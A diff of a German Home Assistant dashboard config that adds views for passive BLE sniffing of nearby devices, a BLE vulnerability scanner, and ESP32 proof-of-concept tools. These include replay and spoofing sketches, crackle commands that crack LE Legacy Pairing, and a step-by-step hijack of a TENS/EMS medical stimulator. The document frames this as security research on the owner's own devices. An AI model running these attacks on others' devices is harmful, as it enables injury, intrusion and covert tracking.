@@ -14,17 +14,16 @@ views:
         cards:
           - type: entities
             title: "Netzwerk Status"
-            icon: mdi:lan
             entities:
               - entity: sensor.netzwerk_status
                 name: Gesamtstatus
               - entity: binary_sensor.unifi_controller_online
                 name: UniFi Controller
-              - entity: sensor.unifi_gateway_status
+              - entity: sensor.usg_3p_state
                 name: USG Gateway
               - entity: sensor.unifi_aps_online
                 name: APs Online
-              - entity: sensor.unifi_clients_total
+              - entity: sensor.unifi_total_clients
                 name: WLAN Clients
 
           - type: markdown
@@ -51,7 +50,7 @@ views:
                  │         VLANs 1,10-13     │
                  │                            │
                  │ Gi0/4: U6+ AZ (Trunk)     │
-                 │ Gi0/5: U6+ Keller (Trunk) │
+                 │ Gi0/5: U6+ WZ (Trunk) │
                  │         VLANs 1,10-13     │
                  └────────────────────────────┘
 
@@ -172,7 +171,7 @@ views:
               | Cloud Key Plus | 192.168.1.7 | 1 (access) | UCK G2+ |
               | USG 3P | VLAN 666 (WAN) | Trunk 1,10-13 | UGW3 |
               | U6+ Arbeitszimmer | DHCP (VLAN 1) | Trunk 1,10-13 | UAPL6 |
-              | U6+ Keller | DHCP (VLAN 1) | Trunk 1,10-13 | UAPL6 |
+              | U6+ WZ | DHCP (VLAN 1) | Trunk 1,10-13 | UAPL6 |
 
               ### Switches
               | Geraet | IP | Modell |
@@ -224,7 +223,7 @@ views:
               ssh root@192.168.178.173
 
               # ESXi7
-              ssh YOUR_USER@192.168.178.174
+              ssh mpauli@192.168.178.174
               ```
 
           - type: markdown
@@ -278,17 +277,16 @@ views:
         cards:
           - type: entities
             title: "UniFi Gesamtstatus"
-            icon: mdi:check-network
             entities:
               - entity: sensor.netzwerk_status
                 name: Gesamtstatus
               - entity: binary_sensor.unifi_controller_online
                 name: Controller (CK+ @ 192.168.1.7)
-              - entity: sensor.unifi_gateway_status
+              - entity: sensor.usg_3p_state
                 name: Gateway (USG 3P)
-              - entity: sensor.unifi_aps_online
+              - entity: sensor.unifi_aps_online_2
                 name: Access Points Online
-              - entity: sensor.unifi_clients_total
+              - entity: sensor.unifi_clients_total_2
                 name: Clients Gesamt
               - entity: sensor.unifi_radar_nearby_total
                 name: Nearby Geraete
@@ -304,7 +302,7 @@ views:
               - entity: sensor.bad_bad
                 name: "Bad:Bad"
                 icon: mdi:incognito
-              - entity: sensor.bad_inet
+              - entity: sensor.bad_net
                 name: "Bad:INet (Netz)"
                 icon: mdi:web
 
@@ -316,7 +314,7 @@ views:
                 name: "Bad:IoT"
               - entity: switch.bad_bad
                 name: "Bad:Bad"
-              - entity: switch.bad_inet
+              - entity: switch.bad_net
                 name: "Bad:INet"
 
       # --- Access Point Details ---
@@ -325,7 +323,6 @@ views:
         cards:
           - type: entities
             title: "U6+ 1.OG (Arbeitszimmer)"
-            icon: mdi:access-point
             entities:
               - entity: sensor.u6_1_og_state
                 name: Status
@@ -345,29 +342,27 @@ views:
                 name: LED
 
           - type: entities
-            title: "U6+ Keller"
-            icon: mdi:access-point
+            title: "U6+ WZ"
             entities:
-              - entity: sensor.u6_keller_state
+              - entity: sensor.u6_wz_state
                 name: Status
-              - entity: sensor.ap_keller_clients
+              - entity: sensor.ap_wz_clients
                 name: Clients
-              - entity: sensor.u6_keller_cpu_utilization
+              - entity: sensor.u6_wz_cpu_utilization
                 name: CPU
-              - entity: sensor.u6_keller_memory_utilization
+              - entity: sensor.u6_wz_memory_utilization
                 name: RAM
-              - entity: sensor.u6_keller_uptime
+              - entity: sensor.u6_wz_uptime
                 name: Uptime
-              - entity: update.u6_keller
+              - entity: update.u6_wz
                 name: Firmware
-              - entity: button.u6_keller_restart
+              - entity: button.u6_wz_restart
                 name: Neustart
-              - entity: light.u6_keller_led
+              - entity: light.u6_wz_led
                 name: LED
 
           - type: entities
             title: "Gateway (USG 3P)"
-            icon: mdi:router-network
             entities:
               - entity: sensor.usg_3p_state
                 name: Status
@@ -388,6 +383,30 @@ views:
               - entity: button.usg_3p_restart
                 name: Neustart
 
+          - type: entities
+            title: "USG-3P Watchdog (eigener Monitor)"
+            state_color: true
+            entities:
+              - entity: binary_sensor.usg_3p_watchdog_usg_3p_watchdog
+                name: Watchdog-Status
+                secondary_info: last-changed
+              - entity: sensor.usg_3p_watchdog_usg_3p_uptime
+                name: Uptime (Watchdog)
+              - type: attribute
+                entity: binary_sensor.usg_3p_watchdog_usg_3p_watchdog
+                attribute: cpu
+                name: CPU
+                suffix: " %"
+              - type: attribute
+                entity: binary_sensor.usg_3p_watchdog_usg_3p_watchdog
+                attribute: mem
+                name: RAM
+                suffix: " %"
+              - type: attribute
+                entity: binary_sensor.usg_3p_watchdog_usg_3p_watchdog
+                attribute: version
+                name: Firmware
+
       # --- WiFi Radar (Interaktiv) ---
       - type: grid
         title: "WiFi Radar (Live)"
@@ -404,7 +423,7 @@ views:
         content: |
           ### Radar Vollbild
           <a href="/local/radar3.html?ap=0" target="_blank" style="display:inline-block;background:#2a2a4a;color:#00d4ff;padding:8px 16px;border-radius:6px;text-decoration:none;margin:4px;">1.OG</a>
-          <a href="/local/radar3.html?ap=1" target="_blank" style="display:inline-block;background:#2a2a4a;color:#00d4ff;padding:8px 16px;border-radius:6px;text-decoration:none;margin:4px;">Keller</a>
+          <a href="/local/radar3.html?ap=1" target="_blank" style="display:inline-block;background:#2a2a4a;color:#00d4ff;padding:8px 16px;border-radius:6px;text-decoration:none;margin:4px;">WZ</a>
           <a href="/local/radar3.html" target="_blank" style="display:inline-block;background:#2a2a4a;color:#00d4ff;padding:8px 16px;border-radius:6px;text-decoration:none;margin:4px;">Beide</a>
 
       # --- Verbundene Clients ---
@@ -452,7 +471,7 @@ views:
               {% endif %}
 
           - type: markdown
-            title: "U6+ Keller"
+            title: "U6+ WZ"
             content: >
               {% set radar = state_attr('sensor.unifi_radar', 'aps') %}
               {% if radar and radar | length > 1 %}
@@ -514,3 +533,878 @@ views:
               **Loesung:** CK+ eine zusaetzliche IP auf
               VLAN 11 (10.10.0.x) geben, oder VLAN 1 auf den
               Uplink erlauben.
+
+  # =========================================================================
+  # BLE Radar (Ubertooth)
+  # =========================================================================
+  - title: BLE Radar
+    path: ble-radar
+    icon: mdi:radar
+    type: sections
+    max_columns: 3
+    sections:
+      # --- Headline + Stats ---
+      - type: grid
+        cards:
+          - type: markdown
+            content: |
+              ## Live-Bluetooth-Umgebung
+              Ubertooth One sniffed passiv das 2.4-GHz-BLE-Band, klassifiziert
+              jedes Advertisement und korreliert RSSI, MAC-Typ und Hersteller.
+              Stark = innen am Radar, schwach = aussen.
+          - type: horizontal-stack
+            cards:
+              - type: custom:mushroom-template-card
+                primary: BLE aktiv
+                secondary: "{{ states('sensor.ubertooth_ble_monitor_ble_gerate_aktiv') }} Geräte"
+                icon: mdi:bluetooth
+                icon_color: blue
+                fill_container: true
+              - type: custom:mushroom-template-card
+                primary: Apple FindMy
+                secondary: "{{ states('sensor.ubertooth_ble_monitor_apple_findmy_beacons') }} Beacons"
+                icon: mdi:apple-finder
+                icon_color: >
+                  {% if (states('sensor.ubertooth_ble_monitor_apple_findmy_beacons') | int(0)) > 0 %}red{% else %}grey{% endif %}
+                fill_container: true
+              - type: custom:mushroom-template-card
+                primary: Apple Nearby
+                secondary: "{{ states('sensor.ubertooth_ble_monitor_apple_nearby_continuity') }} Geräte"
+                icon: mdi:apple
+                icon_color: deep-purple
+                fill_container: true
+          - type: horizontal-stack
+            cards:
+              - type: custom:mushroom-template-card
+                primary: iBeacon
+                secondary: "{{ states('sensor.ubertooth_ble_monitor_ibeacon') }}"
+                icon: mdi:bluetooth-audio
+                icon_color: indigo
+                fill_container: true
+              - type: custom:mushroom-template-card
+                primary: Microsoft Cont.
+                secondary: "{{ states('sensor.ubertooth_ble_monitor_microsoft_continuity') }}"
+                icon: mdi:microsoft
+                icon_color: cyan
+                fill_container: true
+              - type: custom:mushroom-template-card
+                primary: Random MACs
+                secondary: "{{ states('sensor.ubertooth_ble_monitor_ble_random_address_ratio') }}% privat"
+                icon: mdi:incognito
+                icon_color: amber
+                fill_container: true
+
+      # --- Radar Plot ---
+      - type: grid
+        cards:
+          - type: custom:apexcharts-card
+            header:
+              title: BLE Radar
+              show: true
+              show_states: false
+            graph_span: 1m
+            chart_type: scatter
+            apex_config:
+              chart:
+                height: 460
+                background: "#0d111a"
+                foreColor: "#94a3b8"
+              theme:
+                mode: dark
+              xaxis:
+                type: numeric
+                min: -1.1
+                max: 1.1
+                tickAmount: 4
+                labels:
+                  show: false
+                axisTicks:
+                  show: false
+                axisBorder:
+                  show: false
+              yaxis:
+                min: -1.1
+                max: 1.1
+                tickAmount: 4
+                labels:
+                  show: false
+                axisTicks:
+                  show: false
+                axisBorder:
+                  show: false
+              grid:
+                show: true
+                borderColor: "#1e293b"
+                xaxis:
+                  lines:
+                    show: true
+                yaxis:
+                  lines:
+                    show: true
+              legend:
+                show: true
+                position: bottom
+                fontSize: 11px
+              markers:
+                size: 8
+                strokeWidth: 1
+                strokeColors: "#0d111a"
+              tooltip:
+                theme: dark
+                custom: |
+                  EVAL:function({ seriesIndex, dataPointIndex, w }) {
+                    var s = w.config.series[seriesIndex];
+                    var p = s.data[dataPointIndex];
+                    return '<div style="padding:6px 10px;font-family:monospace;">'
+                      + '<b>'+s.name+'</b><br>'
+                      + 'MAC: '+(p.mac||'?')+'<br>'
+                      + 'RSSI: '+(p.rssi||'?')+' dBm<br>'
+                      + 'Vendor: '+(p.vendor||'?')
+                      + '</div>';
+                  }
+            series:
+              - name: Apple FindMy
+                color: "#ef4444"
+                entity: sensor.ubertooth_ble_monitor_ble_radar_daten
+                data_generator: |
+                  return (entity.attributes.series_apple_findmy || []).map(p => ({x:p.x, y:p.y, mac:p.mac, rssi:p.rssi, vendor:p.vendor}));
+              - name: Apple Nearby
+                color: "#a855f7"
+                entity: sensor.ubertooth_ble_monitor_ble_radar_daten
+                data_generator: |
+                  return (entity.attributes.series_apple_nearby || []).map(p => ({x:p.x, y:p.y, mac:p.mac, rssi:p.rssi, vendor:p.vendor}));
+              - name: iBeacon
+                color: "#3b82f6"
+                entity: sensor.ubertooth_ble_monitor_ble_radar_daten
+                data_generator: |
+                  return (entity.attributes.series_ibeacon || []).map(p => ({x:p.x, y:p.y, mac:p.mac, rssi:p.rssi, vendor:p.vendor}));
+              - name: Microsoft
+                color: "#06b6d4"
+                entity: sensor.ubertooth_ble_monitor_ble_radar_daten
+                data_generator: |
+                  return (entity.attributes.series_microsoft || []).map(p => ({x:p.x, y:p.y, mac:p.mac, rssi:p.rssi, vendor:p.vendor}));
+              - name: Govee
+                color: "#10b981"
+                entity: sensor.ubertooth_ble_monitor_ble_radar_daten
+                data_generator: |
+                  return (entity.attributes.series_govee || []).map(p => ({x:p.x, y:p.y, mac:p.mac, rssi:p.rssi, vendor:p.vendor}));
+              - name: Eddystone
+                color: "#f59e0b"
+                entity: sensor.ubertooth_ble_monitor_ble_radar_daten
+                data_generator: |
+                  return (entity.attributes.series_eddystone || []).map(p => ({x:p.x, y:p.y, mac:p.mac, rssi:p.rssi, vendor:p.vendor}));
+              - name: Apple Other
+                color: "#fb7185"
+                entity: sensor.ubertooth_ble_monitor_ble_radar_daten
+                data_generator: |
+                  return (entity.attributes.series_apple_other || []).map(p => ({x:p.x, y:p.y, mac:p.mac, rssi:p.rssi, vendor:p.vendor}));
+              - name: Generic
+                color: "#64748b"
+                entity: sensor.ubertooth_ble_monitor_ble_radar_daten
+                data_generator: |
+                  return (entity.attributes.series_generic || []).map(p => ({x:p.x, y:p.y, mac:p.mac, rssi:p.rssi, vendor:p.vendor}));
+
+          - type: markdown
+            content: |
+              **Radar-Lesart**: Die Distanz vom Mittelpunkt entspricht
+              der **Signalstärke** des Geräts:
+
+              | Position | RSSI | Bedeutung |
+              |---|---|---|
+              | Zentrum | -30 dBm | direkt nebenan (1-2 m) |
+              | Mittlerer Ring | -65 dBm | gleicher Raum (~5 m) |
+              | Aussenring | -100 dBm | Rand der Reichweite |
+
+              Die **Winkelposition** ist aus dem MAC-Hash abgeleitet
+              (deterministisch — gleiches Gerät bleibt am gleichen Ort).
+              ApexCharts kann nicht echt-polar; die Achsen sind
+              kartesisch (-1.0 .. 1.0).
+
+      # --- AirTag-Stalker Alarm ---
+      - type: grid
+        cards:
+          - type: custom:mushroom-template-card
+            primary: AirTag-Stalker-Alarm
+            secondary: >
+              {% if is_state('binary_sensor.ubertooth_ble_monitor_fremder_airtag_in_nahe', 'on') %}
+              ⚠ FindMy-Beacon dauerhaft in Reichweite
+              {% else %}
+              keine fremden FindMy-Beacons persistent
+              {% endif %}
+            icon: mdi:apple-finder
+            icon_color: >
+              {% if is_state('binary_sensor.ubertooth_ble_monitor_fremder_airtag_in_nahe', 'on') %}red{% else %}green{% endif %}
+            fill_container: true
+            tap_action:
+              action: more-info
+              entity: binary_sensor.ubertooth_ble_monitor_fremder_airtag_in_nahe
+
+          - type: custom:mushroom-template-card
+            primary: Stärkstes BLE-Signal
+            secondary: "{{ states('sensor.ubertooth_ble_monitor_starkstes_ble_signal') }} dBm"
+            icon: mdi:signal-cellular-3
+            icon_color: >
+              {% set r = states('sensor.ubertooth_ble_monitor_starkstes_ble_signal') | int(-127) %}
+              {% if r > -50 %}red{% elif r > -70 %}orange{% else %}green{% endif %}
+            fill_container: true
+
+      # --- RSSI Histogramm ---
+      - type: grid
+        cards:
+          - type: custom:apexcharts-card
+            header:
+              title: RSSI-Verteilung (Live)
+              show: true
+            chart_type: bar
+            graph_span: 1m
+            apex_config:
+              chart:
+                height: 280
+              theme:
+                mode: dark
+              plotOptions:
+                bar:
+                  horizontal: true
+                  borderRadius: 4
+                  dataLabels:
+                    position: top
+              dataLabels:
+                enabled: true
+                offsetX: 30
+                style:
+                  colors: ["#94a3b8"]
+              xaxis:
+                title:
+                  text: Geräte
+              yaxis:
+                title:
+                  text: Signalstärke
+              legend:
+                show: false
+            series:
+              - name: Geräte
+                color: "#3b82f6"
+                entity: sensor.ubertooth_ble_monitor_ble_rssi_histogramm
+                data_generator: |
+                  return (entity.attributes.bins || []).map((b, i) => ({x: b.label, y: b.count}));
+
+          - type: custom:apexcharts-card
+            header:
+              title: Adv-Channel-Belegung
+              show: true
+            chart_type: donut
+            graph_span: 1m
+            apex_config:
+              chart:
+                height: 280
+              theme:
+                mode: dark
+              labels:
+                - "Ch 37 (2402 MHz)"
+                - "Ch 38 (2426 MHz)"
+                - "Ch 39 (2480 MHz)"
+              colors: ["#3b82f6", "#10b981", "#f59e0b"]
+              legend:
+                position: bottom
+            series:
+              - name: ch37
+                entity: sensor.ubertooth_ble_monitor_ble_adv_channel_verteilung
+                attribute: ch37
+              - name: ch38
+                entity: sensor.ubertooth_ble_monitor_ble_adv_channel_verteilung
+                attribute: ch38
+              - name: ch39
+                entity: sensor.ubertooth_ble_monitor_ble_adv_channel_verteilung
+                attribute: ch39
+
+      # --- Top-Devices Liste ---
+      - type: grid
+        cards:
+          - type: markdown
+            title: Top BLE-Geräte (nach Adv-Frequenz)
+            content: |
+              | MAC | Kategorie | Vendor | RSSI | Pakete | Sek seit erst |
+              |---|---|---|---|---|---|
+              {%- for d in (state_attr('sensor.ubertooth_ble_monitor_ble_gerate_liste', 'devices') or [])[:20] %}
+              | `{{ d.mac }}` | {{ d.category }} | {{ d.vendor }} | {{ d.rssi }} dBm | {{ d.count }} | {{ d.first_seen_ago_s }}s |
+              {%- endfor %}
+
+      # --- Zeitverlauf ---
+      - type: grid
+        cards:
+          - type: custom:mini-graph-card
+            name: BLE-Geräte über Zeit
+            entities:
+              - sensor.ubertooth_ble_monitor_ble_gerate_aktiv
+              - sensor.ubertooth_ble_monitor_apple_nearby_continuity
+            hours_to_show: 24
+            points_per_hour: 4
+            line_width: 2
+            show:
+              fill: fade
+              labels: true
+              extrema: true
+
+          - type: custom:mini-graph-card
+            name: Stärkstes Signal (24h)
+            entities:
+              - sensor.ubertooth_ble_monitor_starkstes_ble_signal
+            hours_to_show: 24
+            points_per_hour: 6
+            line_color: orange
+            show:
+              fill: fade
+              extrema: true
+
+      # --- Erklärung der Korrelationen ---
+      - type: grid
+        cards:
+          - type: markdown
+            title: Was du in den Daten lesen kannst
+            content: |
+              **Apple-Continuity-Schwankungen** korrelieren mit
+              Anwesenheit: AirPods/Watch/iPhone-Nähe broadcasten
+              alle 100-1280 ms.
+
+              **Random-Address-Ratio** zeigt wie privacy-aware die
+              Umgebung ist. Iphone/Mac/Win11 nutzen Random; alte
+              IoT-Geräte / Spielzeug bleiben public.
+
+              **Ch37-only**: ubertooth-btle ohne Hopping hört nur
+              den ersten der drei Adv-Channels — Geräte die nur
+              auf 38 oder 39 senden, fehlen.
+
+              **Persistente FindMy-Beacons** > 5 Min bei
+              wechselnden RSSI-Werten = Hinweis auf einen
+              AirTag der dir folgt (Auto/Tasche).
+
+              **Strongest-RSSI-Sprünge** + neue MAC > 100 ms
+              wiederholt = jemand bewegt sich gerade durch die
+              Nähe (potentieller Tracking-Indikator).
+
+  # =========================================================================
+  # BLE Vuln-Scanner
+  # =========================================================================
+  - title: BLE Vuln-Scanner
+    path: ble-vulns
+    icon: mdi:shield-bug
+    type: sections
+    max_columns: 3
+    sections:
+      # --- Header + Counters ---
+      - type: grid
+        cards:
+          - type: markdown
+            content: |
+              ## BLE Vulnerability Scanner
+              Passive Erkennung anhand von Adv-Daten:
+              **Manufacturer-IDs** (verwundbare SoC-Familien),
+              **Service-UUIDs** (HID, Lock, Beacon),
+              **GAP Appearance** (Schloss, Tastatur, Glucose...),
+              **Pairing-Mode-Hints** (Public-MAC + LE Disco).
+
+              Findings sind **passive Heuristiken** — Exploit-Reife
+              musst du am Zielgerät nachweisen. PoC-Sketches liegen
+              in `/opt/ubertooth-mqtt/poc/`.
+          - type: horizontal-stack
+            cards:
+              - type: custom:mushroom-template-card
+                primary: High
+                secondary: "{{ states('sensor.ubertooth_ble_monitor_ble_vulns_high') }}"
+                icon: mdi:shield-alert
+                icon_color: red
+                fill_container: true
+              - type: custom:mushroom-template-card
+                primary: Medium
+                secondary: "{{ states('sensor.ubertooth_ble_monitor_ble_vulns_medium') }}"
+                icon: mdi:shield-half-full
+                icon_color: orange
+                fill_container: true
+              - type: custom:mushroom-template-card
+                primary: Low
+                secondary: "{{ states('sensor.ubertooth_ble_monitor_ble_vulns_low') }}"
+                icon: mdi:shield-off-outline
+                icon_color: amber
+                fill_container: true
+              - type: custom:mushroom-template-card
+                primary: Info
+                secondary: "{{ states('sensor.ubertooth_ble_monitor_ble_vulns_info') }}"
+                icon: mdi:information-outline
+                icon_color: blue
+                fill_container: true
+
+      # --- Findings-Tabelle ---
+      - type: grid
+        cards:
+          - type: markdown
+            title: Geflaggte Geräte (Top 20 nach Severity / Signal)
+            content: |
+              {%- set devs = state_attr('sensor.ubertooth_ble_monitor_ble_vuln_findings', 'devices') or [] %}
+              {%- if devs|length == 0 %}
+              _Noch keine Findings — Daemon sammelt für 30 s._
+              {%- else %}
+              | Sev | MAC | Kategorie | Vendor | RSSI | Findings |
+              |---|---|---|---|---|---|
+              {%- for d in devs[:20] %}
+              {%- set icon = {'high':'🔴','medium':'🟠','low':'🟡','info':'🔵'}.get(d.max_severity, '⚪') %}
+              | {{ icon }} | `{{ d.mac }}` | {{ d.category }} | {{ d.vendor }} | {{ d.rssi }} dBm | {{ d.findings | map(attribute='code') | list | join(', ') }} |
+              {%- endfor %}
+              {%- endif %}
+
+      # --- Detail-View pro Gerät ---
+      - type: grid
+        cards:
+          - type: markdown
+            title: Detail-Findings (alle Severity ≥ Low)
+            content: |
+              {%- set devs = state_attr('sensor.ubertooth_ble_monitor_ble_vuln_findings', 'devices') or [] %}
+              {%- for d in devs[:10] %}
+              {%- set has_real = d.findings | selectattr('severity', 'in', ['high','medium','low']) | list | length > 0 %}
+              {%- if has_real %}
+              ### `{{ d.mac }}` — {{ d.category }} ({{ d.vendor }})
+              **Name**: {{ d.name or '-' }} • **RSSI**: {{ d.rssi }} dBm
+              {%- for f in d.findings %}
+              - **[{{ f.severity | upper }}] {{ f.title }}**
+                {{ f.detail }}
+                {%- if f.poc_template %}
+                → PoC: `/opt/ubertooth-mqtt/poc/{{ f.poc_template }}.ino`
+                {%- endif %}
+              {%- endfor %}
+              {%- endif %}
+              {%- endfor %}
+
+      # --- PoC-Anleitungen ---
+      - type: grid
+        cards:
+          - type: markdown
+            title: PoC-Toolkit (ESP32)
+            content: |
+              Im NUC unter `/opt/ubertooth-mqtt/poc/` liegen 5 Arduino-Sketches.
+              Hardware: ESP32-Devkit (kein ESP8266 — kein nativer BT).
+
+              | Sketch | Wann | Was | Vuln-Code |
+              |---|---|---|---|
+              | `esp32_ble_replay.ino` | smart-Schloss / Beacon | exakter Adv-Replay mit gespoofter MAC | VULN_BLE_LOCK |
+              | `esp32_ibeacon_spoof.ino` | bestehendes iBeacon | UUID/Major/Minor selbst senden | VULN_BEACON_REPLAY |
+              | `esp32_apple_continuity_flood.ino` | eigene iPhones | Pop-up-Storm-Test (CVE-2020-9819) | INFO_APPLE_CONTINUITY |
+              | `esp32_swift_pair_spoof.ino` | eigene Win11-PCs | Swift-Pair-Pop-up triggern | INFO_MS_SWIFT_PAIR |
+              | `esp32_gatt_fuzzer.ino` | verwundbare SoC | connect+enumerate+arbitrary writes | VULN_SOC_VENDOR |
+
+              **Workflow**: Im Vuln-Scanner-Findings-Block oben den
+              `poc_template`-Wert ablesen → Sketch öffnen →
+              `TARGET_MAC` / `TARGET_UUID` etc. anpassen → mit Arduino-IDE
+              flashen → Serial Monitor (115200 bps) öffnen.
+          - type: markdown
+            title: Ubertooth Pairing-Sniff (für VULN_HID_LEGACY etc.)
+            content: |
+              ```bash
+              # 1. Pairing-Capture starten (auf NUC, root):
+              ubertooth-btle -f -t aa:bb:cc:dd:ee:ff -c /tmp/pair.pcap
+
+              # 2. Auf dem Ziel: Pairing-Vorgang triggern
+              #    (Schloss neu pairen, Tastatur neu koppeln, …)
+
+              # 3. Crackle gegen den Capture:
+              apt install crackle
+              crackle -i /tmp/pair.pcap
+
+              # Ausgabe bei Legacy-Pairing:
+              # !!!
+              # !!! TK FOUND: 000000
+              # !!!
+              # LTK derived: ...
+              ```
+              Wenn `crackle` einen TK/STK findet, nutzt das Ziel
+              **LE Legacy Pairing** ohne Secure Connections — also
+              passiver Mitschnitt + spätere Decryption möglich.
+
+      # --- Vendor-Risiko-Übersicht ---
+      - type: grid
+        cards:
+          - type: markdown
+            title: Bekannte verwundbare SoC-Familien (Lookup-Tabelle)
+            content: |
+              | MfrID (LE) | Hersteller | Vuln-Familie |
+              |---|---|---|
+              | 0x000D | Texas Instruments CC2540/2640 | SweynTooth |
+              | 0x0131 | Cypress PSoC 6/4 | SweynTooth |
+              | 0x0211 | Telink TLSR8x | SweynTooth-like |
+              | 0x02E5 | Espressif ESP32 (BT-Classic) | BrakTooth |
+              | 0x004F | Nordic nRF5 SDK <15 | SweynTooth |
+              | 0x0059 | Nordic nRF52 (alte FW) | SweynTooth-Window |
+
+              **Quellen**: ASSET-Group SUTD (SweynTooth, BrakTooth),
+              Bluetooth SIG Security Notices, NIST NVD.
+
+  # =========================================================================
+  # Medical-Device PoC (Bureau Veritas Pattern)
+  # =========================================================================
+  - title: Med-Device PoC
+    path: med-device-poc
+    icon: mdi:medical-bag
+    type: sections
+    max_columns: 2
+    sections:
+      # --- Header / Article-Reference ---
+      - type: grid
+        cards:
+          - type: markdown
+            content: |
+              ## Medical-Device BLE Hijack (Bureau Veritas Pattern)
+
+              **Quelle**: Bureau Veritas Cybersecurity (Lakshminaryanan & Nota)
+              dokumentierten einen BLE-EMS/TENS-Muskelstimulator mit:
+              - schreibbaren Handles 0x07/0x0B/0x10-0x13 ohne Auth
+                (Privacy-Flag, Reconnection-Address, Intensity-Werte)
+              - Hijacking via MITM moeglich
+                (Original-Android-App verliert Verbindung)
+              - DF2-Payload-Format Central→Peripheral: `str=NN\r\n`
+
+              **Sicherheits-Impact**: Angreifer kann Stimulationsstärke
+              ändern → bei höheren Werten gefährliche Muskelreaktionen.
+
+              ### Reproduktions-Hardware (alles vorhanden)
+              | Phase | Hardware | Tool |
+              |---|---|---|
+              | 1. Recon (passiv) | Ubertooth One | `ubertooth-btle -f -t MAC -c cap.pcap` |
+              | 2. PCAP-Analyse | Wireshark/tshark | ATT-Protokoll dekodieren |
+              | 3. Pairing-Crack | Ubertooth + crackle | `crackle -i cap.pcap` |
+              | 4. Active GATT | Intel BT 9560 + bleak | `active_gatt_scan.py MAC` |
+              | 5. PoC-Hijack | ESP32 | `esp32_med_device_hijack.ino` |
+
+      - type: grid
+        cards:
+          - type: markdown
+            title: Schritt 1 — Passive Recon (Ubertooth + Wireshark)
+            content: |
+              ```bash
+              # auf NUC-HA, root:
+              ubertooth-btle -f -t aa:bb:cc:dd:ee:ff -c /tmp/dut.pcap
+              # parallel App auf Android starten, Programm ausführen
+              # ^C nach 30-60 s
+              tshark -r /tmp/dut.pcap -Y btatt -V | less
+              # oder: wireshark /tmp/dut.pcap
+              ```
+              Im PCAP suchst du nach **WriteRequest**-Frames mit
+              ASCII-lesbaren Payloads à la `str=NN\r\n` —
+              zeigt Format und Ziel-Handle.
+
+          - type: markdown
+            title: Schritt 2 — Active GATT-Enumeration (bleak)
+            content: |
+              ```bash
+              # Discover-Mode:
+              sudo /opt/ubertooth-mqtt/active_gatt_scan.py --scan
+
+              # Detail auf Ziel-MAC:
+              sudo /opt/ubertooth-mqtt/active_gatt_scan.py aa:bb:cc:dd:ee:ff
+
+              # Optional: Probe-Write testen (sicheres "str=0"):
+              sudo /opt/ubertooth-mqtt/active_gatt_scan.py \
+                  aa:bb:cc:dd:ee:ff --probe-write "str=0"
+              ```
+              Output zeigt schreibbare Char-UUIDs.
+              Diese kopierst du in `esp32_med_device_hijack.ino`.
+
+      - type: grid
+        cards:
+          - type: markdown
+            title: Schritt 3 — Pairing-Crack (falls verschlüsselt)
+            content: |
+              ```bash
+              # Wenn der DUT LE-Pairing nutzt:
+              # 1. Pairing zwischen App + DUT NEU triggern
+              #    (Bluetooth aus/an, neu pairen) während ubertooth-btle laeuft
+              # 2. Capture stoppen, dann:
+              crackle -i /tmp/dut.pcap
+
+              # Wenn LE Legacy Pairing:
+              #   !!!
+              #   !!! TK FOUND: 000000
+              #   !!!
+              #   LTK derived: ...
+              # -> spaeter mit -l <LTK> entschluesseln:
+              crackle -i /tmp/dut.pcap -l <LTK> -o /tmp/dut_decrypted.pcap
+              ```
+              Wenn `crackle` einen TK findet: Gerät nutzt **LE Legacy Pairing**
+              (Just Works/Passkey). Heutige Standards verlangen LE Secure
+              Connections — Legacy ist crackbar.
+
+          - type: markdown
+            title: Schritt 4 — ESP32-PoC anpassen + flashen
+            content: |
+              In `/opt/ubertooth-mqtt/poc/esp32_med_device_hijack.ino`:
+              ```cpp
+              #define TARGET_MAC          "aa:bb:cc:dd:ee:ff"
+              const char* TARGET_CHAR_UUID = "<aus active_gatt_scan>";
+              const uint8_t INTENSITY_MIN = 5;
+              const uint8_t INTENSITY_MAX = 25;   // Sicherheits-Cap
+              ```
+              In Arduino IDE 2.x:
+              - Boards: ESP32 Dev Module
+              - Port: dein ESP32 (`/dev/ttyUSB0` etc., NICHT der ESP8266)
+              - Upload Speed: 921600
+              - Hochladen, Serial Monitor 115200 öffnen
+
+              Sketch macht: connect → sweep `str=5` bis `str=25` mit 1.5s Pause.
+              Beobachte das DUT — bei BV-Pattern Zucken / Stimulation sichtbar.
+
+      # --- Tools-Status ---
+      - type: grid
+        cards:
+          - type: entities
+            title: Installierte Tools
+            entities:
+              - type: section
+                label: BLE Stack
+              - entity: sensor.ubertooth_ble_monitor_ble_gerate_aktiv
+                name: Ubertooth Live-BLE Devices
+              - entity: sensor.ubertooth_ble_monitor_ble_vuln_findings
+                name: Vuln-Findings Total
+              - type: section
+                label: WiFi Stack
+              - entity: sensor.esp8266_wifi_worker_wifi1_wifi_probe_gerate
+                name: WiFi Probe Sniffer (ESP8266)
+
+          - type: markdown
+            title: Tool-Pfade
+            content: |
+              | Tool | Pfad | Zweck |
+              |---|---|---|
+              | `crackle` | `/usr/local/bin/crackle` | LE-Legacy-Pairing crack |
+              | `ubertooth-btle` | `/usr/bin/ubertooth-btle` | passive BLE sniff |
+              | `tshark/wireshark` | `/usr/bin/tshark` | PCAP analyse |
+              | `gatttool` | `/usr/bin/gatttool` | aktive GATT (legacy) |
+              | `active_gatt_scan.py` | `/opt/ubertooth-mqtt/` | bleak-Frontend |
+              | PoC-Sketches | `/opt/ubertooth-mqtt/poc/` | ESP32/ESP8266 |
+              | Daemon | `systemctl status ubertooth-mqtt` | Vuln-Scanner-Daemon |
+
+      # --- Ethical Reminder ---
+      - type: grid
+        cards:
+          - type: markdown
+            content: |
+              ## Ethisch / Rechtlich
+              - Aktive Tests **nur auf eigenen Geräten**.
+              - Therapie-Hardware **nicht** im aktiven Therapie-Einsatz testen.
+              - Keine fremde Infrastruktur scannen / spoofen
+                (§202c StGB, §317 StGB, BGB §823).
+              - Findings vor Veröffentlichung dem OEM melden
+                (Coordinated Disclosure, 90 Tage).
+
+  # =========================================================================
+  # PoC Control (Device-Picker + Action-Picker)
+  # =========================================================================
+  - title: PoC Control
+    path: poc-control
+    icon: mdi:gamepad-variant
+    type: sections
+    max_columns: 2
+    sections:
+      - type: grid
+        cards:
+          - type: markdown
+            content: |
+              ## PoC Control Panel
+              **Workflow**: 
+              1. Worker waehlen (ESP32 für BLE-PoCs, ESP8266 für WiFi-Recon)
+              2. Ziel-MAC aus Vuln-Scanner-Liste picken
+              3. Aktion waehlen
+              4. Parameter setzen (UUID/Payload/Intensity je nach Action)
+              5. **Ausführen** — Worker bekommt MQTT-Command, Status erscheint live unten
+
